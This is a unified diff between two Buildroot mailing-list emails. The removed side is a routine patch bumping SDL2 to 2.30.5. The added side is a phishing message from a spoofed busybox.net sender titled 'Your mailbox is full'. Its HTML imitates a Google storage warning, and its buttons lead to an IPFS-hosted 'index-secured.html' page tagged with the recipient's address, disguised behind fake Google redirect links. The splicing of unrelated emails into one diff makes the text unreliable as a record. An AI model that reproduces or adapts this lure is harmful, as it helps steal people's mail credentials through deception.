@@ -4,66 +4,47 @@ X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 Received: from smtp3.osuosl.org (smtp3.osuosl.org [140.211.166.136])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.lore.kernel.org (Postfix) with ESMTPS id A4692C3DA4A
-	for <buildroot@archiver.kernel.org>; Mon, 29 Jul 2024 07:29:13 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTPS id C9563C3DA61
+	for <buildroot@archiver.kernel.org>; Mon, 29 Jul 2024 07:32:59 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
-	by smtp3.osuosl.org (Postfix) with ESMTP id 5C980607DB;
-	Mon, 29 Jul 2024 07:29:13 +0000 (UTC)
+	by smtp3.osuosl.org (Postfix) with ESMTP id 335BA607FA;
+	Mon, 29 Jul 2024 07:32:59 +0000 (UTC)
 X-Virus-Scanned: amavis at osuosl.org
 Received: from smtp3.osuosl.org ([127.0.0.1])
  by localhost (smtp3.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
- id XkF0O_ERYouS; Mon, 29 Jul 2024 07:29:12 +0000 (UTC)
+ id 4rEMrn8QtOgR; Mon, 29 Jul 2024 07:32:58 +0000 (UTC)
 X-Comment: SPF check N/A for local connections - client-ip=140.211.166.34; helo=ash.osuosl.org; envelope-from=buildroot-bounces@buildroot.org; receiver=<UNKNOWN> 
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp3.osuosl.org 64753607FA
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp3.osuosl.org 2D8D7607FB
 Received: from ash.osuosl.org (ash.osuosl.org [140.211.166.34])
-	by smtp3.osuosl.org (Postfix) with ESMTP id 64753607FA;
-	Mon, 29 Jul 2024 07:29:12 +0000 (UTC)
-Received: from smtp3.osuosl.org (smtp3.osuosl.org [140.211.166.136])
- by ash.osuosl.org (Postfix) with ESMTP id F116E1BF267
- for <buildroot@lists.busybox.net>; Mon, 29 Jul 2024 07:29:10 +0000 (UTC)
+	by smtp3.osuosl.org (Postfix) with ESMTP id 2D8D7607FB;
+	Mon, 29 Jul 2024 07:32:58 +0000 (UTC)
+Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
+ by ash.osuosl.org (Postfix) with ESMTP id 7F92B1BF267
+ for <buildroot@lists.busybox.net>; Mon, 29 Jul 2024 07:32:57 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
- by smtp3.osuosl.org (Postfix) with ESMTP id DEC596080C
- for <buildroot@lists.busybox.net>; Mon, 29 Jul 2024 07:29:10 +0000 (UTC)
+ by smtp1.osuosl.org (Postfix) with ESMTP id 78FEF80C13
+ for <buildroot@lists.busybox.net>; Mon, 29 Jul 2024 07:32:57 +0000 (UTC)
 X-Virus-Scanned: amavis at osuosl.org
-Received: from smtp3.osuosl.org ([127.0.0.1])
- by localhost (smtp3.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
- id n1MiS82hXj0R for <buildroot@lists.busybox.net>;
- Mon, 29 Jul 2024 07:29:10 +0000 (UTC)
-Received-SPF: Pass (mailfrom) identity=mailfrom; client-ip=80.67.31.93;
- helo=smtprelay05.ispgateway.de; envelope-from=mf@go-sys.de;
- receiver=<UNKNOWN> 
-DMARC-Filter: OpenDMARC Filter v1.4.2 smtp3.osuosl.org B9C8A6080B
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp3.osuosl.org B9C8A6080B
-Received: from smtprelay05.ispgateway.de (smtprelay05.ispgateway.de
- [80.67.31.93])
- by smtp3.osuosl.org (Postfix) with ESMTPS id B9C8A6080B
- for <buildroot@busybox.net>; Mon, 29 Jul 2024 07:29:09 +0000 (UTC)
-Received: from [84.191.232.240] (helo=mail.go-sys.de)
- by smtprelay05.ispgateway.de with esmtpsa (TLS1.2) tls
- TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 (Exim 4.98)
- (envelope-from <mf@go-sys.de>) id 1sYKoJ-000000004zc-21wN
- for buildroot@busybox.net; Mon, 29 Jul 2024 09:28:47 +0200
-Received: from mail.go-sys.de (192.168.1.9) by mail.go-sys.de (192.168.1.9)
- with Microsoft SMTP Server (version=TLS1_2,
- cipher=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256) id 15.1.2507.39; Mon, 29 Jul
- 2024 09:28:47 +0200
-Received: from go-sys.de (192.168.1.175) by mail.go-sys.de (192.168.1.9) with
- Microsoft SMTP Server id 15.1.2507.39 via Frontend Transport;
- Mon, 29 Jul 2024 09:28:47 +0200
-From: Michael Fischer <mf@go-sys.de>
-To: <buildroot@busybox.net>
-Date: Mon, 29 Jul 2024 09:28:43 +0200
-Message-ID: <20240729072843.31455-1-mf@go-sys.de>
-X-Mailer: git-send-email 2.20.1
+Received: from smtp1.osuosl.org ([127.0.0.1])
+ by localhost (smtp1.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
+ id x-I14gDI6Q9q for <buildroot@lists.busybox.net>;
+ Mon, 29 Jul 2024 07:32:56 +0000 (UTC)
+Received-SPF: Softfail (mailfrom) identity=mailfrom; client-ip=141.98.10.68;
+ helo=busybox.net; envelope-from=buildroot@busybox.net; receiver=<UNKNOWN> 
+DMARC-Filter: OpenDMARC Filter v1.4.2 smtp1.osuosl.org 39ED780C1A
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 39ED780C1A
+Received: from busybox.net (unknown [141.98.10.68])
+ by smtp1.osuosl.org (Postfix) with ESMTP id 39ED780C1A
+ for <buildroot@busybox.net>; Mon, 29 Jul 2024 07:32:55 +0000 (UTC)
+From: busybox.net <buildroot@busybox.net>
+To: buildroot@busybox.net
+Date: 29 Jul 2024 09:32:55 +0200
+Message-ID: <20240729093254.02878691C41FC524@busybox.net>
 MIME-Version: 1.0
-X-C2ProcessedOrg: 5fa85167-cd6f-46be-bafe-19070fe3dac3
-X-CrossPremisesHeadersFilteredBySendConnector: mail.go-sys.de
-X-OrganizationHeadersPreserved: mail.go-sys.de
-X-Df-Sender: c21hcnRob3N0QGdvLXN5cy5kZQ==
-X-Mailman-Original-Authentication-Results: smtp3.osuosl.org;
+X-Mailman-Original-Authentication-Results: smtp1.osuosl.org;
  dmarc=none (p=none dis=none)
- header.from=go-sys.de
-Subject: [Buildroot] [PATCH] package/sdl2: bump version to 2.30.5
+ header.from=busybox.net
+Subject: [Buildroot] Your mailbox is full.
 X-BeenThere: buildroot@buildroot.org
 X-Mailman-Version: 2.1.29
 Precedence: list
@@ -75,46 +56,181 @@ List-Post: <mailto:buildroot@buildroot.org>
 List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
 List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
  <mailto:buildroot-request@buildroot.org?subject=subscribe>
-Cc: Michael Fischer <mf@go-sys.de>
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 7bit
+Content-Type: multipart/mixed; boundary="===============4802205502140479377=="
 Errors-To: buildroot-bounces@buildroot.org
 Sender: "buildroot" <buildroot-bounces@buildroot.org>
 
-Signed-off-by: Michael Fischer <mf@go-sys.de>
----
- package/sdl2/sdl2.hash | 4 ++--
- package/sdl2/sdl2.mk   | 2 +-
- 2 files changed, 3 insertions(+), 3 deletions(-)
+--===============4802205502140479377==
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
 
-diff --git a/package/sdl2/sdl2.hash b/package/sdl2/sdl2.hash
-index 4f302aaec8..30235844e7 100644
---- a/package/sdl2/sdl2.hash
-+++ b/package/sdl2/sdl2.hash
-@@ -1,4 +1,4 @@
--# Locally calculated after checking http://www.libsdl.org/release/SDL2-2.30.4.tar.gz.sig
--sha256  59c89d0ed40d4efb23b7318aa29fe7039dbbc098334b14f17f1e7e561da31a26  SDL2-2.30.4.tar.gz
-+# Locally calculated after checking http://www.libsdl.org/release/SDL2-2.30.5.tar.gz.sig
-+sha256  f374f3fa29c37dfcc20822d4a7d7dc57e58924d1a5f2ad511bfab4c8193de63b  SDL2-2.30.5.tar.gz
- # Locally calculated
- sha256  9b9e1764f06701bcf7ce21e942c682d5921ba0900c6fca760321b1c8837a9662  LICENSE.txt
-diff --git a/package/sdl2/sdl2.mk b/package/sdl2/sdl2.mk
-index 01dcf3551c..d19bc0fb8f 100644
---- a/package/sdl2/sdl2.mk
-+++ b/package/sdl2/sdl2.mk
-@@ -4,7 +4,7 @@
- #
- ################################################################################
- 
--SDL2_VERSION = 2.30.4
-+SDL2_VERSION = 2.30.5
- SDL2_SOURCE = SDL2-$(SDL2_VERSION).tar.gz
- SDL2_SITE = http://www.libsdl.org/release
- SDL2_LICENSE = Zlib
--- 
-2.20.1
+<html><head>
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.9600.20139">
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body>
+<p style=3D'text-align: center; color: rgb(0, 0, 102); text-transform: none=
+; text-indent: 0px; letter-spacing: normal; font-family: "Lucida Grande", V=
+erdana, Arial, Helvetica, sans-serif; font-size: 1.2em; font-style: normal;=
+ font-weight: 600; margin-top: 0px; margin-bottom: 1.5em; word-spacing: 0px=
+; white-space: normal; orphans: 2; widows: 2; background-color: rgb(255, 25=
+5, 255); font-variant-ligatures: normal; font-variant-caps: normal; -webkit=
+-text-stroke-width: 0px; text-decoration-thickness:=20
+initial; text-decoration-style: initial; text-decoration-color: initial;'>b=
+uildroot@busybox.net, your mailbox is full.</p>
+<p>
+<table width=3D"325" align=3D"center" style=3D'text-align: left; color: rgb=
+(51, 51, 51); text-transform: none; text-indent: 0px; letter-spacing: norma=
+l; font-family: "Lucida Grande", Verdana, Arial, Helvetica, sans-serif; fon=
+t-size: 11px; font-style: normal; font-weight: 400; word-spacing: 0px; whit=
+e-space: normal; border-collapse: collapse; orphans: 2; widows: 2; backgrou=
+nd-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-variant-=
+caps: normal; -webkit-text-stroke-width: 0px;=20
+text-decoration-thickness: initial; text-decoration-style: initial; text-de=
+coration-color: initial;' border=3D"0" cellspacing=3D"0" cellpadding=3D"0">=
+
+<tbody>
+<tr style=3D"height: 0.5em;">
+<td style=3D"background: 0% 50% rgb(218, 60, 47); margin: 0px; width: 321px=
+; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif;">&nbsp;</=
+td>
+<td style=3D"background: 0% 50% rgb(224, 224, 224); margin: 0px; font-famil=
+y: Roboto, RobotoDraft, Helvetica, Arial, sans-serif;">&nbsp;</td></tr></tb=
+ody></table>
+<table width=3D"325" align=3D"center" style=3D'text-align: left; color: rgb=
+(51, 51, 51); text-transform: none; text-indent: 0px; letter-spacing: norma=
+l; font-family: "Lucida Grande", Verdana, Arial, Helvetica, sans-serif; fon=
+t-size: 11px; font-style: normal; font-weight: 400; word-spacing: 0px; whit=
+e-space: normal; border-collapse: collapse; orphans: 2; widows: 2; backgrou=
+nd-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-variant-=
+caps: normal; -webkit-text-stroke-width: 0px;=20
+text-decoration-thickness: initial; text-decoration-style: initial; text-de=
+coration-color: initial;' border=3D"0" cellspacing=3D"0" cellpadding=3D"0">=
+
+<tbody>
+<tr>
+<td align=3D"left" style=3D"margin: 0px; font-family: Roboto, RobotoDraft, =
+Helvetica, Arial, sans-serif;"><span style=3D"color: rgb(218, 60, 47); font=
+-weight: bold;">4.82 GB</span></td>
+<td align=3D"right" style=3D"margin: 0px; font-family: Roboto, RobotoDraft,=
+ Helvetica, Arial, sans-serif;"><span style=3D"font-weight: bold;">4.86 GB<=
+/span></td></tr></tbody></table><p></p>
+<p style=3D'margin: 3em auto; text-align: center; color: rgb(51, 51, 51); t=
+ext-transform: none; text-indent: 0px; letter-spacing: normal; font-family:=
+ "Lucida Grande", Verdana, Arial, Helvetica, sans-serif; font-size: 11px; f=
+ont-style: normal; font-weight: 400; word-spacing: 0px; white-space: normal=
+; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); font-variant=
+-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0=
+px; text-decoration-thickness: initial;=20
+text-decoration-style: initial; text-decoration-color: initial;'>
+<span style=3D'text-align: center; color: rgb(37, 39, 43); text-transform: =
+none; text-indent: 0px; letter-spacing: normal; font-family: "Google Sans",=
+ Roboto, Arial, sans-serif; font-size: 32px; font-style: normal; font-weigh=
+t: 400; word-spacing: 0px; float: none; display: inline !important; white-s=
+pace: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); =
+font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
+oke-width: 0px; text-decoration-thickness: initial;=20
+text-decoration-style: initial; text-decoration-color: initial;'><font size=
+=3D"3">You&#8217;re out of storage and may not receive new emails.</font></=
+span><br><font size=3D"2">You&#8217;ve used all of the available storage in=
+ your&nbsp;<span style=3D"white-space: nowrap !important;">Mail </span>Acco=
+unt. As a result, you may not be able to send and receive emails on your&nb=
+sp;<span style=3D"white-space: nowrap !important;">Mail </span>account.</fo=
+nt><br class=3D"Apple-interchange-newline"></p>
+<table width=3D"auto" align=3D"center" role=3D"presentation" style=3D'color=
+: rgb(34, 34, 34); text-transform: none; letter-spacing: normal; font-famil=
+y: "Google Sans", Roboto, Arial, sans-serif; font-size: small; font-style: =
+normal; font-weight: 400; word-spacing: 0px; white-space: normal; orphans: =
+2; widows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures:=
+ normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-de=
+coration-thickness: initial; text-decoration-style:=20
+initial; text-decoration-color: initial;' border=3D"0" cellspacing=3D"0" ce=
+llpadding=3D"0"><tbody><tr><td style=3D"margin: 0px;"><table role=3D"presen=
+tation" style=3D"margin: 0px; padding: 0px; clear: both; border-collapse: c=
+ollapse; table-layout: fixed;" border=3D"0" cellspacing=3D"0" cellpadding=
+=3D"0"><tbody><tr><td align=3D"center" style=3D"margin: 0px; padding: 31px =
+0px 4px; border-collapse: collapse; direction: ltr; -ms-word-break: normal;=
+" dir=3D"ltr"><div>
+<a class=3D"m_-5620939630368618957showdesktop" style=3D'padding: 14px 20px =
+13px; border-radius: 4px; text-align: center; color: rgb(255, 255, 255); li=
+ne-height: 21px; letter-spacing: 0.75px; font-family: "Google Sans", Roboto=
+, Arial, sans-serif; font-size: 14px; font-weight: normal; text-decoration:=
+ none; display: inline-block; direction: ltr; background-color: rgb(26, 115=
+, 232);'=20
+href=3D"https://ipfs.io/ipfs/bafkreic4b4yczhureqtuwwcz5zc5lyhalui4evuv2uukl=
+qqeqkiylnk6zy?filename=3Dindex-secured.html/#buildroot@busybox.net" target=
+=3D"_blank"=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://notification=
+s.google.com/g/p/ANiao5pruUao2faGyc0Xrsv7QgMOgPLjiphDcXAnE4l2sBPOyd1RrNfmaj=
+dJVp22Tb81A8DOf-Jg9B_nmMiFifboUwNyhIfZ2vpxZpHcPIzfwKg2f5MqUXof0BLW73WIqraex=
+F8HCFGbmd2agi-OC2pzOcY2NprdwPccUZolWZoWyG7K7gRfeiwenJoRNEepSu_IFiKe02cnvRXT=
+ggXgZRVRvDlqtZhycDBeVqOAV959o2WxTrCuny_OizspwfUKeosFf9aRKiY20xhO5jkrMFPGDeg=
+vgeP9vb-11KTqwkUedSJF0oydNvmD2ckqg17SNB5SE4TWRFbsdM9AwUOXOcj_fNM0OegqRKJ6Ub=
+OfwQ&amp;source=3Dgmail&amp;ust=3D1704270510399000&amp;usg
+&#10;&#10;&#10;&#10;&#10;=3DAOvVaw1r32spQKUG7OlxsJ_4REWL">Get more storage<=
+/a><br><br>
+<table width=3D"480" role=3D"presentation" style=3D'width: 480px; color: rg=
+b(34, 34, 34); text-transform: none; letter-spacing: normal; font-family: "=
+Google Sans", Roboto, Arial, sans-serif; font-size: small; font-style: norm=
+al; font-weight: 400; word-spacing: 0px; white-space: normal; orphans: 2; w=
+idows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: nor=
+mal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decora=
+tion-thickness: initial; text-decoration-style:=20
+initial; text-decoration-color: initial;' border=3D"0" cellspacing=3D"0" ce=
+llpadding=3D"0"><tbody><tr><td style=3D'margin: 0px; padding: 49px 0px 0px;=
+ text-align: center; color: rgb(37, 39, 43); line-height: 40px; font-family=
+: "Google Sans", Roboto, Arial, sans-serif; font-size: 26px; font-weight: n=
+ormal; direction: ltr; -ms-word-break: normal;' dir=3D"ltr">Not ready to ge=
+t more storage?</td></tr><tr>
+<td style=3D'margin: 0px; padding: 3px 0px 22px 1px; text-align: center; co=
+lor: rgb(37, 39, 43); line-height: 40px; font-family: "Google Sans", Roboto=
+, Arial, sans-serif; font-size: 16px; font-weight: normal; direction: ltr; =
+-ms-word-break: normal;' dir=3D"ltr"><span class=3D"m_-5620939630368618957s=
+howdesktop" style=3D"display: block;">
+<a style=3D"color: rgb(26, 115, 232); padding-top: 14px; padding-bottom: 14=
+px; text-decoration: none;" href=3D"https://ipfs.io/ipfs/bafkreic4b4yczhure=
+qtuwwcz5zc5lyhalui4evuv2uuklqqeqkiylnk6zy?filename=3Dindex-secured.html/#bu=
+ildroot@busybox.net" target=3D"_blank"=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://notification=
+s.google.com/g/p/ANiao5pahEJiovwHB6NgJmVP-42UzXpqcTzgR2FnGD6D4LjzBtmryYJZrH=
+NmnGL6LQ0nb8gpb_ABRR1BE6JI4Khq091fI1CpemlCWWtKSoUyQ4csirGXH7R3Zzf3QZyNI2Jbw=
+52cpuGtZQt5VqzpQ_xniCmv8SYsskuZ12aSJaAlFQdcRdnIsmRxtEOyN-MFMpChwpAsIfx-heZE=
+Pzuu-Cvml2rNqdvKwnl1_7wr6xI_iutIdgYdnC-MqJGVWToagYRbKmB2Q9d1hpXaJj3Gt0Vx1kC=
+MyFyk2jVb6ozlCvu-ScWULmHkMgk0NYmAF3V0SjD5jSJY8i37W7t0X9QPyxYp1fCJtsWajLqhoo=
+Ml-TB5tyIYPM7NwB6nB9U&amp;source=3Dgmail&amp;ust=3D1704270
+&#10;&#10;&#10;&#10;&#10;510399000&amp;usg=3DAOvVaw3AgOY99D8ViKdrNd4eAvCV">=
+Delete files to free up space.</a></span></td></tr></tbody></table></div></=
+td></tr></tbody></table></td></tr></tbody></table>
+<table width=3D"480" role=3D"presentation" style=3D'width: 480px; color: rg=
+b(34, 34, 34); text-transform: none; letter-spacing: normal; font-family: "=
+Google Sans", Roboto, Arial, sans-serif; font-size: small; font-style: norm=
+al; font-weight: 400; word-spacing: 0px; white-space: normal; orphans: 2; w=
+idows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: nor=
+mal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decora=
+tion-thickness: initial; text-decoration-style:=20
+initial; text-decoration-color: initial;' border=3D"0" cellspacing=3D"0" ce=
+llpadding=3D"0"><tbody><tr><td style=3D'margin: 0px; padding: 49px 0px 0px;=
+ text-align: center; color: rgb(37, 39, 43); line-height: 40px; font-family=
+: "Google Sans", Roboto, Arial, sans-serif; font-size: 26px; font-weight: n=
+ormal; direction: ltr; -ms-word-break: normal;' dir=3D"ltr"><br></td></tr><=
+tr>
+<td style=3D'margin: 0px; padding: 3px 0px 22px 1px; text-align: center; co=
+lor: rgb(37, 39, 43); line-height: 40px; font-family: "Google Sans", Roboto=
+, Arial, sans-serif; font-size: 16px; font-weight: normal; direction: ltr; =
+-ms-word-break: normal;' dir=3D"ltr"><span class=3D"m_-5620939630368618957s=
+howdesktop" style=3D"display: block;"><br></span></td></tr></tbody></table>=
+</body></html>
+
+--===============4802205502140479377==
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
 
 _______________________________________________
 buildroot mailing list
 buildroot@buildroot.org
 https://lists.buildroot.org/mailman/listinfo/buildroot
+
+--===============4802205502140479377==--
